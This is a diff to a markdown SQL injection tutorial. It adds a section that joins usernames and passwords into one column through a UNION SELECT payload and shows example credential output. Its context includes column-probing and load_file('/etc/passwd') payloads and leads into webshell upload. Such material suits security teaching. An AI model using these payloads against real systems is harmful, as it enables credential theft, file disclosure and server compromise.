@@ -332,7 +332,7 @@ After detect that the application is vulnerable to SQLi we need to know how many
 /index.php?id=1 order by 4 - ERROR
 ```
 
-## Output Layout
+## Finding Columns with a useful data type
 
 Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.
 
@@ -369,7 +369,21 @@ Some databases allows us to read or write files in the filesystem.
 ```
 /index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
 ```
+## Retrieving multiple values within a single column
 
+We can also concat multiple values for examples users and passwords and print on a single column.
+
+```
+' UNION SELECT username || '~' || password FROM users--
+```
+
+The output will be:
+
+```
+administrator~s3cure
+wiener~peter
+carlos~montoya
+```
 # From SQLi to RCE
 
 Since we are allowed to upload files, we can upload a webshell to the web root.
